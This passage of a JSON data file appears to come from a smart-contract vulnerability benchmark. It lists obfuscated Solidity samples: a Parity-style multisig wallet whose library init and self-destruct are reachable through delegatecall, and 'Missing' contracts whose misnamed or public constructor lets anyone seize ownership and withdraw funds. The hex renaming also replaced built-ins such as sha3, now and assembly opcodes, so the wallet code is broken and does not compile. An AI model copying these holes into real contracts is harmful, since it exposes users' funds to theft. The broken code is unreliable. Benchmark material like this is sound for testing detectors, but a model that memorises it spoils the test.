bytes32 _0x81628f, uint value, address _0x0c74f0, bytes data, address _0x595b20);\n  // Confirmation still needed for a transaction.\n  event ConfirmationNeeded(bytes32 _0x81628f, address _0x4b90bc, uint value, address _0x0c74f0, bytes data);\n}\n\ncontract WalletAbi {\n  // Revokes a prior confirmation of the given operation\n  function _0x657c32(bytes32 _0xafdf42) external;\n\n  // Replaces an owner `_from` with another `_to`.\n  function _0x2eb1f9(address _0xd80c42, address _0x6227f9) external;\n\n  function _0xa86307(address _0x81ca90) external;\n\n  function _0xe3da76(address _0x81ca90) external;\n\n  function _0x9140cb(uint _0x4bd7be) external;\n\n  function _0xf1fb98(address _0x1a94e8) constant returns (bool);\n\n  function _0x2da483(bytes32 _0xafdf42, address _0x81ca90) external constant returns (bool);\n\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function _0xfe0a8a(uint _0x411ee3) external;\n\n  function _0x1388b7(address _0x6227f9, uint _0x5ff3d0, bytes _0x2d9416) external returns (bytes32 _0x4e2769);\n  function _0xf30d43(bytes32 _0x3f6470) returns (bool _0x584d00);\n}\n\ncontract WalletLibrary is WalletEvents {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n  // TYPES\n\n  // struct for the status of a pending operation.\n  struct PendingState {\n    uint _0x09d0b8;\n    uint _0x305eba;\n    uint _0x2134af;\n  }\n\n  // Transaction structure to remember details of transaction lest it need be saved for a later call.\n  struct Transaction {\n    address _0x0c74f0;\n    uint value;\n    bytes data;\n  }\n\n  // MODIFIERS\n\n  // simple single-sig function modifier.\n  modifier _0x9d6928 {\n    if (_0xf1fb98(msg.sender))\n      _;\n  }\n  // multi-sig function modifier: the operation must have an intrinsic hash in order\n  // that later attempts can be realised as the same underlying operation and\n  // thus count as confirmations.\n  modifier _0xf513e8(bytes32 _0xafdf42) {\n    if (_0x1b27db(_0xafdf42))\n      _;\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n  }\n\n  // constructor is given number of sigs required to do protected \"onlymanyowners\" transactions\n  // as well as the selection of addresses capable of confirming them.\n  function _0x41c37e(address[] _0xb21f87, uint _0x4e74ef) {\n    _0xa8aa20 = _0xb21f87.length + 1;\n    _0x339556[1] = uint(msg.sender);\n    _0x77e0f3[uint(msg.sender)] = 1;\n    for (uint i = 0; i < _0xb21f87.length; ++i)\n    {\n      _0x339556[2 + i] = uint(_0xb21f87[i]);\n      _0x77e0f3[uint(_0xb21f87[i])] = 2 + i;\n    }\n    _0x91dab1 = _0x4e74ef;\n  }\n\n  // Revokes a prior confirmation of the given operation\n  function _0x657c32(bytes32 _0xafdf42) external {\n        bool _flag3 = false;\n        if (false) { revert(); }\n    uint _0xcd2d3e = _0x77e0f3[uint(msg.sender)];\n    // make sure they're an owner\n    if (_0xcd2d3e == 0) return;\n    uint _0x0e4d75 = 2**_0xcd2d3e;\n    var _0x2a7654 = _0x02a746[_0xafdf42];\n    if (_0x2a7654._0x305eba & _0x0e4d75 > 0) {\n      _0x2a7654._0x09d0b8++;\n      _0x2a7654._0x305eba -= _0x0e4d75;\n      Revoke(msg.sender, _0xafdf42);\n    }\n  }\n\n  // Replaces an owner `_from` with another `_to`.\n  function _0x2eb1f9(address _0xd80c42, address _0x6227f9) _0xf513e8(_0x787a41(msg.data)) external {\n    if (_0xf1fb98(_0x6227f9)) return;\n    uint _0xcd2d3e = _0x77e0f3[uint(_0xd80c42)];\n    if (_0xcd2d3e == 0) return;\n\n    _0x91c8e0();\n    _0x339556[_0xcd2d3e] = uint(_0x6227f9);\n    _0x77e0f3[uint(_0xd80c42)] = 0;\n    _0x77e0f3[uint(_0x6227f9)] = _0xcd2d3e;\n    OwnerChanged(_0xd80c42, _0x6227f9);\n  }\n\n  function _0xa86307(address _0x81ca90) _0xf513e8(_0x787a41(msg.data)) external {\n    if (_0xf1fb98(_0x81ca90)) return;\n\n    _0x91c8e0();\n    if (_0xa8aa20 >= _0xc25716)\n      _0x1e6528();\n    if (_0xa8aa20 >= _0xc25716)\n      return;\n    _0xa8aa20++;\n    _0x339556[_0xa8aa20] = uint(_0x81ca90);\n    _0x77e0f3[uint(_0x81ca90)] = _0xa8aa20;\n    OwnerAdded(_0x81ca90);\n  }\n\n  function _0xe3da76(address _0x81ca90) _0xf513e8(_0x787a41(msg.data)) external {\n    uint _0xcd2d3e = _0x77e0f3[uint(_0x81ca90)];\n    if (_0xcd2d3e == 0) return;\n    if (_0x91dab1 > _0xa8aa20 - 1) return;\n\n    _0x339556[_0xcd2d3e] = 0;\n    _0x77e0f3[uint(_0x81ca90)] = 0;\n    _0x91c8e0();\n    _0x1e6528(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot\n    OwnerRemoved(_0x81ca90);\n  }\n\n  function _0x9140cb(uint _0x4bd7be) _0xf513e8(_0x787a41(msg.data)) external {\n    if (_0x4bd7be > _0xa8aa20) return;\n    _0x91dab1 = _0x4bd7be;\n    _0x91c8e0();\n    RequirementChanged(_0x4bd7be);\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function _0x074422(uint _0xcd2d3e) external constant returns (address) {\n    return address(_0x339556[_0xcd2d3e + 1]);\n  }\n\n  function _0xf1fb98(address _0x1a94e8) constant returns (bool) {\n    return _0x77e0f3[uint(_0x1a94e8)] > 0;\n  }\n\n  function _0x2da483(bytes32 _0xafdf42, address _0x81ca90) external constant returns (bool) {\n    var _0x2a7654 = _0x02a746[_0xafdf42];\n    uint _0xcd2d3e = _0x77e0f3[uint(_0x81ca90)];\n\n    // make sure they're an owner\n    if (_0xcd2d3e == 0) return false;\n\n    // determine the bit to set for this owner.\n    uint _0x0e4d75 = 2**_0xcd2d3e;\n    return !(_0x2a7654._0x305eba & _0x0e4d75 == 0);\n  }\n\n  // constructor - stores initial daily limit and records the present day's index.\n  function _0x018435(uint _0x744a84) {\n    _0x6164bf = _0x744a84;\n    _0xea93f7 = _0x764828();\n  }\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function _0xfe0a8a(uint _0x411ee3) _0xf513e8(_0x787a41(msg.data)) external {\n    _0x6164bf = _0x411ee3;\n  }\n  // resets the amount already spent today. needs many of the owners to confirm.\n  function _0xfeadc2() _0xf513e8(_0x787a41(msg.data)) external {\n    _0x2ac759 = 0;\n  }\n\n  // constructor - just pass on the owner array to the multiowned and\n  // the limit to daylimit\n  function _0x3012dd(address[] _0xb21f87, uint _0x4e74ef, uint _0xb96d53) {\n    _0x018435(_0xb96d53);\n    _0x41c37e(_0xb21f87, _0x4e74ef);\n  }\n\n  // kills the contract sending everything to `_to`.\n  function _0x381db0(address _0x6227f9) _0xf513e8(_0x787a41(msg.data)) external {\n    suicide(_0x6227f9);\n  }\n\n  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.\n  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide\n  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value\n  // and _data arguments). They still get the option of using them if they want, anyways.\n  function _0x1388b7(address _0x6227f9, uint _0x5ff3d0, bytes _0x2d9416) external _0x9d6928 returns (bytes32 _0x4e2769) {\n    // first, take the opportunity to check that we're under the daily limit.\n    if ((_0x2d9416.length == 0 && _0xff2ba8(_0x5ff3d0)) || _0x91dab1 == 1) {\n      // yes - just execute the call.\n      address _0x595b20;\n      if (_0x6227f9 == 0) {\n        _0x595b20 = _0xe942a6(_0x5ff3d0, _0x2d9416);\n      } else {\n        if (!_0x6227f9.call.value(_0x5ff3d0)(_0x2d9416))\n          throw;\n      }\n      SingleTransact(msg.sender, _0x5ff3d0, _0x6227f9, _0x2d9416, _0x595b20);\n    } else {\n      // determine our operation hash.\n      if (true) { _0x4e2769 = _0x787a41(msg.data, block.number); }\n      // store if it's new\n      if (_0x97076c[_0x4e2769]._0x0c74f0 == 0 && _0x97076c[_0x4e2769].value == 0 && _0x97076c[_0x4e2769].data.length == 0) {\n        _0x97076c[_0x4e2769]._0x0c74f0 = _0x6227f9;\n        _0x97076c[_0x4e2769].value = _0x5ff3d0;\n        _0x97076c[_0x4e2769].data = _0x2d9416;\n      }\n      if (!_0xf30d43(_0x4e2769)) {\n        ConfirmationNeeded(_0x4e2769, msg.sender, _0x5ff3d0, _0x6227f9, _0x2d9416);\n      }\n    }\n  }\n\n  function _0xe942a6(uint _0x5ff3d0, bytes _0xbfe697) internal returns (address _0xa330b7) {\n    assembly {\n      _0xa330b7 := _0xe942a6(_0x5ff3d0, add(_0xbfe697, 0x20), mload(_0xbfe697))\n      _0x9d5515(_0x00e7ac, iszero(extcodesize(_0xa330b7)))\n    }\n  }\n\n  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order\n  // to determine the body of the transaction from the hash provided.\n  function _0xf30d43(bytes32 _0x3f6470) _0xf513e8(_0x3f6470) returns (bool _0x584d00) {\n    if (_0x97076c[_0x3f6470]._0x0c74f0 != 0 || _0x97076c[_0x3f6470].value != 0 || _0x97076c[_0x3f6470].data.length != 0) {\n      address _0x595b20;\n      if (_0x97076c[_0x3f6470]._0x0c74f0 == 0) {\n        _0x595b20 = _0xe942a6(_0x97076c[_0x3f6470].value, _0x97076c[_0x3f6470].data);\n      } else {\n        if (!_0x97076c[_0x3f6470]._0x0c74f0.call.value(_0x97076c[_0x3f6470].value)(_0x97076c[_0x3f6470].data))\n          throw;\n      }\n\n      MultiTransact(msg.sender, _0x3f6470, _0x97076c[_0x3f6470].value, _0x97076c[_0x3f6470]._0x0c74f0, _0x97076c[_0x3f6470].data, _0x595b20);\n      delete _0x97076c[_0x3f6470];\n      return true;\n    }\n  }\n\n  // INTERNAL METHODS\n\n  function _0x1b27db(bytes32 _0xafdf42) internal returns (bool) {\n    // determine what index the present sender is:\n    uint _0xcd2d3e = _0x77e0f3[uint(msg.sender)];\n    // make sure they're an owner\n    if (_0xcd2d3e == 0) return;\n\n    var _0x2a7654 = _0x02a746[_0xafdf42];\n    // if we're not yet working on this operation, switch over and reset the confirmation status.\n    if (_0x2a7654._0x09d0b8 == 0) {\n      // reset count of confirmations needed.\n      _0x2a7654._0x09d0b8 = _0x91dab1;\n      // reset which owners have confirmed (none) - set our bitmap to 0.\n      _0x2a7654._0x305eba = 0;\n      _0x2a7654._0x2134af = _0x9408f3.length++;\n      _0x9408f3[_0x2a7654._0x2134af] = _0xafdf42;\n    }\n    // determine the bit to set for this owner.\n    uint _0x0e4d75 = 2**_0xcd2d3e;\n    // make sure we (the message sender) haven't confirmed this operation previously.\n    if (_0x2a7654._0x305eba & _0x0e4d75 == 0) {\n      Confirmation(msg.sender, _0xafdf42);\n      // ok - check if count is enough to go ahead.\n      if (_0x2a7654._0x09d0b8 <= 1) {\n        // enough confirmations: reset and run interior.\n        delete _0x9408f3[_0x02a746[_0xafdf42]._0x2134af];\n        delete _0x02a746[_0xafdf42];\n        return true;\n      }\n      else\n      {\n        // not enough: record that this owner in particular confirmed.\n        _0x2a7654._0x09d0b8--;\n        _0x2a7654._0x305eba |= _0x0e4d75;\n      }\n    }\n  }\n\n  function _0x1e6528() private {\n    uint _0xa92fb3 = 1;\n    while (_0xa92fb3 < _0xa8aa20)\n    {\n      while (_0xa92fb3 < _0xa8aa20 && _0x339556[_0xa92fb3] != 0) _0xa92fb3++;\n      while (_0xa8aa20 > 1 && _0x339556[_0xa8aa20] == 0) _0xa8aa20--;\n      if (_0xa92fb3 < _0xa8aa20 && _0x339556[_0xa8aa20] != 0 && _0x339556[_0xa92fb3] == 0)\n      {\n        _0x339556[_0xa92fb3] = _0x339556[_0xa8aa20];\n        _0x77e0f3[_0x339556[_0xa92fb3]] = _0xa92fb3;\n        _0x339556[_0xa8aa20] = 0;\n      }\n    }\n  }\n\n  // checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and\n  // returns true. otherwise just returns false.\n  function _0xff2ba8(uint _0x5ff3d0) internal _0x9d6928 returns (bool) {\n    // reset the spend limit if we're on a different day to last time.\n    if (_0x764828() > _0xea93f7) {\n      _0x2ac759 = 0;\n      if (1 == 1) { _0xea93f7 = _0x764828(); }\n    }\n    // check to see if there's enough left - if so, subtract and return true.\n\n    if (_0x2ac759 + _0x5ff3d0 >= _0x2ac759 && _0x2ac759 + _0x5ff3d0 <= _0x6164bf) {\n      _0x2ac759 += _0x5ff3d0;\n      return true;\n    }\n    return false;\n  }\n\n  // determines today's index.\n  function _0x764828() private constant returns (uint) { return _0xda9258 / 1 days; }\n\n  function _0x91c8e0() internal {\n    uint length = _0x9408f3.length;\n\n    for (uint i = 0; i < length; ++i) {\n      delete _0x97076c[_0x9408f3[i]];\n\n      if (_0x9408f3[i] != 0)\n        delete _0x02a746[_0x9408f3[i]];\n    }\n\n    delete _0x9408f3;\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public _0x91dab1;\n  // pointer used to find a free slot in m_owners\n  uint public _0xa8aa20;\n\n  uint public _0x6164bf;\n  uint public _0x2ac759;\n  uint public _0xea93f7;\n\n  // list of owners\n  uint[256] _0x339556;\n\n  uint constant _0xc25716 = 250;\n  // index on the list of owners to allow reverse lookup\n  mapping(uint => uint) _0x77e0f3;\n  // the ongoing operations.\n  mapping(bytes32 => PendingState) _0x02a746;\n  bytes32[] _0x9408f3;\n\n  // pending transactions we have at present.\n  mapping (bytes32 => Transaction) _0x97076c;\n}\n\ncontract Wallet is WalletEvents {\n\n  // WALLET CONSTRUCTOR\n  //   calls the `initWallet` method of the Library in this context\n  function Wallet(address[] _0xb21f87, uint _0x4e74ef, uint _0xb96d53) {\n    // Signature of the Wallet Library's init function\n    bytes4 sig = bytes4(_0x787a41(\"initWallet(address[],uint256,uint256)\"));\n    address _0x76f9a3 = _walletLibrary;\n\n    // Compute the size of the call data : arrays has 2\n    // 32bytes for offset and length, plus 32bytes per element ;\n    // plus 2 32bytes for each uint\n    uint _0x01ffd9 = (2 + _0xb21f87.length);\n    uint _0x7e11ff = (2 + _0x01ffd9) * 32;\n\n    assembly {\n      // Add the signature first to memory\n      mstore(0x0, sig)\n      // Add the call data, which is at the end of the\n      // code\n      _0x5a2d90(0x4,  sub(_0x2882da, _0x7e11ff), _0x7e11ff)\n      // Delegate call to the library\n      delegatecall(sub(gas, 10000), _0x76f9a3, 0x0, add(_0x7e11ff, 0x4), 0x0, 0x0)\n    }\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n    else if (msg.data.length > 0)\n      _walletLibrary.delegatecall(msg.data);\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function _0x074422(uint _0xcd2d3e) constant returns (address) {\n    return address(_0x339556[_0xcd2d3e + 1]);\n  }\n\n  // As return statement unavailable in fallback, explicit the method here\n\n  function _0x2da483(bytes32 _0xafdf42, address _0x81ca90) external constant returns (bool) {\n    return _walletLibrary.delegatecall(msg.data);\n  }\n\n  function _0xf1fb98(address _0x1a94e8) constant returns (bool) {\n    return _walletLibrary.delegatecall(msg.data);\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public _0x91dab1;\n  // pointer used to find a free slot in m_owners\n  uint public _0xa8aa20;\n\n  uint public _0x6164bf;\n  uint public _0x2ac759;\n  uint public _0xea93f7;\n\n  // list of owners\n  uint[256] _0x339556;\n}",
      "rename_map": {
        "changeRequirement": "_0x9140cb",
        "reorganizeOwners": "_0x1e6528",
        "invalidJumpLabel": "_0x00e7ac",
        "confirmAndCheck": "_0x1b27db",
        "resetSpentToday": "_0xfeadc2",
        "m_pendingIndex": "_0x9408f3",
        "newRequirement": "_0x554bb0",
        "initMultiowned": "_0x41c37e",
        "onlymanyowners": "_0xf513e8",
        "ownerIndexBit": "_0x0e4d75",
        "setDailyLimit": "_0xfe0a8a",
        "argarraysize": "_0x01ffd9",
        "_newRequired": "_0x4bd7be",
        "hasConfirmed": "_0x2da483",
        "m_ownerIndex": "_0x77e0f3",
        "initDaylimit": "_0x018435",
        "m_spentToday": "_0x2ac759",
        "clearPending": "_0x91c8e0",
        "m_dailyLimit": "_0x6164bf",
        "removeOwner": "_0xe3da76",
        "c_maxOwners": "_0xc25716",
        "changeOwner": "_0x2eb1f9",
        "m_numOwners": "_0xa8aa20",
        "ownersDone": "_0x305eba",
        "_operation": "_0xafdf42",
        "ownerIndex": "_0xcd2d3e",
        "initWallet": "_0x3012dd",
        "m_required": "_0x91dab1",
        "underLimit": "_0xff2ba8",
        "yetNeeded": "_0x09d0b8",
        "operation": "_0x81628f",
        "m_pending": "_0x02a746",
        "_daylimit": "_0xb96d53",
        "onlyowner": "_0x9d6928",
        "_newLimit": "_0x411ee3",
        "o_success": "_0x584d00",
        "m_lastDay": "_0xea93f7",
        "_required": "_0x4e74ef",
        "initiator": "_0x4b90bc",
        "addOwner": "_0xa86307",
        "oldOwner": "_0x285db7",
        "m_owners": "_0x339556",
        "getOwner": "_0x074422",
        "newOwner": "_0x373d8c",
        "codecopy": "_0x5a2d90",
        "codesize": "_0x2882da",
        "isOwner": "_0xf1fb98",
        "confirm": "_0xf30d43",
        "execute": "_0x1388b7",
        "created": "_0x595b20",
        "_owners": "_0xb21f87",
        "argsize": "_0x7e11ff",
        "pending": "_0x2a7654",
        "o_hash": "_0x4e2769",
        "_owner": "_0x81ca90",
        "_limit": "_0x744a84",
        "target": "_0x76f9a3",
        "create": "_0xe942a6",
        "o_addr": "_0xa330b7",
        "_value": "_0x5ff3d0",
        "revoke": "_0x657c32",
        "jumpi": "_0x9d5515",
        "index": "_0x2134af",
        "_addr": "_0x1a94e8",
        "m_txs": "_0x97076c",
        "_code": "_0xbfe697",
        "today": "_0x764828",
        "_data": "_0x2d9416",
        "_from": "_0xd80c42",
        "owner": "_0xc80af8",
        "free": "_0xa92fb3",
        "sha3": "_0x787a41",
        "kill": "_0x381db0",
        "now": "_0xda9258",
        "_to": "_0x6227f9",
        "to": "_0x0c74f0",
        "_h": "_0x3f6470"
      },
      "changes": [
        "Renamed 77 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_123",
      "transformed_id": "ss_l4_medium_sn_ds_123",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// taken from https://www.ethereum.org/token#the-coin (4/9/2018)\n\npragma solidity ^0.4.16;\n\ncontract _0xbc6243 {\n    address public _0x398854;\n\n    function _0xbc6243() public {\n        // Placeholder for future logic\n        bool _flag2 = false;\n        _0x398854 = msg.sender;\n    }\n\n    modifier _0x1b1097 {\n        require(msg.sender == _0x398854);\n        _;\n    }\n\n    function _0xbacbdb(address _0xa4f72d) _0x1b1097 public {\n        if (true) { _0x398854 = _0xa4f72d; }\n    }\n}\n\ninterface _0x8cb358 { function _0x39f581(address _0x6947ea, uint256 _0xdaad1c, address _0x30ade4, bytes _0x792f61) external; }\n\ncontract TokenERC20 {\n        bool _flag3 = false;\n        uint256 _unused4 = 0;\n    // Public variables of the token\n    string public _0xdd8c55;\n    string public _0x2f6243;\n    uint8 public _0x815261 = 18;\n    // 18 decimals is the strongly suggested default, avoid changing it\n    uint256 public _0x58f8f0;\n\n    // This creates an array with all balances\n    mapping (address => uint256) public _0xd525a8;\n    mapping (address => mapping (address => uint256)) public _0x0df1de;\n\n    // This generates a public event on the blockchain that will notify clients\n    event Transfer(address indexed from, address indexed _0x026ce7, uint256 value);\n\n    // This generates a public event on the blockchain that will notify clients\n    event Approval(address indexed _0xa6d0d3, address indexed _0xc8a444, uint256 _0xdaad1c);\n\n    function TokenERC20(\n        string _0x757550,\n        string _0xd27aff\n    ) public {\n        _0xdd8c55 = _0x757550;                                   // Set the name for display purposes\n        _0x2f6243 = _0xd27aff;                               // Set the symbol for display purposes\n    }\n\n    function _0x20b086(address _0x6947ea, address _0x670c7e, uint _0xdaad1c) internal {\n        // Prevent transfer to 0x0 address.\n        require(_0x670c7e != 0x0);\n        // Check if the sender has enough\n        require(_0xd525a8[_0x6947ea] >= _0xdaad1c);\n\n        require(_0xd525a8[_0x670c7e] + _0xdaad1c > _0xd525a8[_0x670c7e]);\n        // Save this for an assertion in the future\n        uint _0xcd7b6c = _0xd525a8[_0x6947ea] + _0xd525a8[_0x670c7e];\n        // Subtract from the sender\n        _0xd525a8[_0x6947ea] -= _0xdaad1c;\n        // Add the same to the recipient\n        _0xd525a8[_0x670c7e] += _0xdaad1c;\n        emit Transfer(_0x6947ea, _0x670c7e, _0xdaad1c);\n        // Asserts are used to use static analysis to find bugs in your code. They should never fail\n        assert(_0xd525a8[_0x6947ea] + _0xd525a8[_0x670c7e] == _0xcd7b6c);\n    }\n\n    function transfer(address _0x670c7e, uint256 _0xdaad1c) public returns (bool _0xd04eb4) {\n        _0x20b086(msg.sender, _0x670c7e, _0xdaad1c);\n        return true;\n    }\n\n    function _0xca4cdb(address _0x6947ea, address _0x670c7e, uint256 _0xdaad1c) public returns (bool _0xd04eb4) {\n        require(_0xdaad1c <= _0x0df1de[_0x6947ea][msg.sender]);     // Check allowance\n        _0x0df1de[_0x6947ea][msg.sender] -= _0xdaad1c;\n        _0x20b086(_0x6947ea, _0x670c7e, _0xdaad1c);\n        return true;\n    }\n\n    function _0x655ee2(address _0xc8a444, uint256 _0xdaad1c) public\n        returns (bool _0xd04eb4) {\n        _0x0df1de[msg.sender][_0xc8a444] = _0xdaad1c;\n        emit Approval(msg.sender, _0xc8a444, _0xdaad1c);\n        return true;\n    }\n\n    function _0x768b38(address _0xc8a444, uint256 _0xdaad1c, bytes _0x792f61)\n        public\n        returns (bool _0xd04eb4) {\n        _0x8cb358 _0xe4970f = _0x8cb358(_0xc8a444);\n        if (_0x655ee2(_0xc8a444, _0xdaad1c)) {\n            _0xe4970f._0x39f581(msg.sender, _0xdaad1c, this, _0x792f61);\n            return true;\n        }\n    }\n\n}\n\n/******************************************/\n/*       ADVANCED TOKEN STARTS HERE       */\n/******************************************/\n\ncontract MyAdvancedToken is _0xbc6243, TokenERC20 {\n\n    mapping (address => bool) public _0xbf19f6;\n\n    /* This generates a public event on the blockchain that will notify clients */\n    event FrozenFunds(address _0xe65760, bool _0xcd52a4);\n\n    /* Initializes contract with initial supply tokens to the creator of the contract */\n    function MyAdvancedToken(\n        string _0x757550,\n        string _0xd27aff\n    ) TokenERC20(_0x757550, _0xd27aff) public {}\n\n    /* Internal transfer, only can be called by this contract */\n    function _0x20b086(address _0x6947ea, address _0x670c7e, uint _0xdaad1c) internal {\n        require (_0x670c7e != 0x0);                               // Prevent transfer to 0x0 address.\n        require (_0xd525a8[_0x6947ea] >= _0xdaad1c);               // Check if the sender has enough\n        require (_0xd525a8[_0x670c7e] + _0xdaad1c >= _0xd525a8[_0x670c7e]);\n        require(!_0xbf19f6[_0x6947ea]);                     // Check if sender is frozen\n        require(!_0xbf19f6[_0x670c7e]);                       // Check if recipient is frozen\n        _0xd525a8[_0x6947ea] -= _0xdaad1c;                         // Subtract from the sender\n        _0xd525a8[_0x670c7e] += _0xdaad1c;                           // Add the same to the recipient\n        emit Transfer(_0x6947ea, _0x670c7e, _0xdaad1c);\n    }\n\n    /// @notice Buy tokens from contract by sending ether\n    function _0x21fdf7() payable public {\n        uint _0x88164f = msg.value;                          // calculates the amount\n\t_0xd525a8[msg.sender] += _0x88164f;                  // updates the balance\n        _0x58f8f0 += _0x88164f;                            // updates the total supply\n        _0x20b086(address(0x0), msg.sender, _0x88164f);      // makes the transfer\n    }\n\n    /* Migration function */\n    function _0x10fbf1() _0x1b1097 {\n\tassert(this.balance == _0x58f8f0);                 // consistency check\n\tsuicide(_0x398854);                                      // transfer the ether to the owner and kill the contract\n    }\n}",
      "rename_map": {
        "migrate_and_destroy": "_0x10fbf1",
        "transferOwnership": "_0xbacbdb",
        "previousBalances": "_0xcd7b6c",
        "receiveApproval": "_0x39f581",
        "tokenRecipient": "_0x8cb358",
        "approveAndCall": "_0x768b38",
        "frozenAccount": "_0xbf19f6",
        "transferFrom": "_0xca4cdb",
        "totalSupply": "_0x58f8f0",
        "tokenSymbol": "_0xd27aff",
        "_extraData": "_0x792f61",
        "onlyOwner": "_0x1b1097",
        "balanceOf": "_0xd525a8",
        "_transfer": "_0x20b086",
        "allowance": "_0x0df1de",
        "tokenName": "_0x757550",
        "_spender": "_0xc8a444",
        "newOwner": "_0xa4f72d",
        "decimals": "_0x815261",
        "approve": "_0x655ee2",
        "spender": "_0xe4970f",
        "success": "_0xd04eb4",
        "amount": "_0x88164f",
        "_owner": "_0xa6d0d3",
        "_value": "_0xdaad1c",
        "frozen": "_0xcd52a4",
        "target": "_0xe65760",
        "symbol": "_0x2f6243",
        "_token": "_0x30ade4",
        "_from": "_0x6947ea",
        "owned": "_0xbc6243",
        "owner": "_0x398854",
        "name": "_0xdd8c55",
        "_to": "_0x670c7e",
        "buy": "_0x21fdf7",
        "to": "_0x026ce7"
      },
      "changes": [
        "Renamed 36 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_124",
      "transformed_id": "ss_l4_medium_sn_ds_124",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract Alice {\n    function _0xdc9e62(uint);\n    function _0x44c6ed(int);\n}\n\ncontract Bob {\n    function _0xdc9e62(Alice c){\n        c._0xdc9e62(42);\n    }\n\n    function _0x44c6ed(Alice c){\n        c._0x44c6ed(42);\n    }\n}",
      "rename_map": {
        "setV2": "_0x44c6ed",
        "set": "_0xdc9e62"
      },
      "changes": [
        "Renamed 2 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_125",
      "transformed_id": "ss_l4_medium_sn_ds_125",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private _0x3589b1;\n\n    modifier _0x5dc2b8 {\n        require(msg.sender==_0x3589b1);\n        _;\n    }\n\n    // The name of the constructor should be Missing\n\n    function IamMissing()\n        public\n    {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        _0x3589b1 = msg.sender;\n    }\n\n    function () payable {}\n\n    function _0xfd32a4()\n        public\n        _0x5dc2b8\n    {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n       _0x3589b1.transfer(this.balance);\n    }\n}",
      "rename_map": {
        "onlyowner": "_0x5dc2b8",
        "withdraw": "_0xfd32a4",
        "owner": "_0x3589b1"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_126",
      "transformed_id": "ss_l4_medium_sn_ds_126",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private _0xca0291;\n\n    modifier _0xe3c5e8 {\n        require(msg.sender==_0xca0291);\n        _;\n    }\n    function _0x968586()\n        public\n    {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n        _0xca0291 = msg.sender;\n    }\n\n    function () payable {}\n\n    function _0x24a7e0()\n        public\n        _0xe3c5e8\n    {\n        // Placeholder for future logic\n        bool _flag4 = false;\n       _0xca0291.transfer(this.balance);\n    }\n}",
      "rename_map": {
        "onlyowner": "_0xe3c5e8",
        "withdraw": "_0x24a7e0",
        "missing": "_0x968586",
        "owner": "_0xca0291"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_127",
      "transformed_id": "ss_l4_medium_sn_ds_127",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private _0xc07184;\n\n    modifier _0x415e26 {\n        require(msg.sender==_0xc07184);\n        _;\n    }\n    function Constructor()\n        public\n    {\n        uint256 _unused1 = 0;\n        bool _flag2 = false;\n        _0xc07184 = msg.sender;\n    }\n\n    function () payable {}\n\n    function _0xaea6ce()\n        public\n        _0x415e26\n    {\n        // Placeholder for future logic\n        bool _flag4 = false;\n       _0xc07184.transfer(this.balance);\n    }\n\n}",
      "rename_map": {
        "onlyowner": "_0x415e26",
        "withdraw": "_0xaea6ce",
        "owner": "_0xc07184"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_128",
      "transformed_id": "ss_l4_medium_sn_ds_128",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
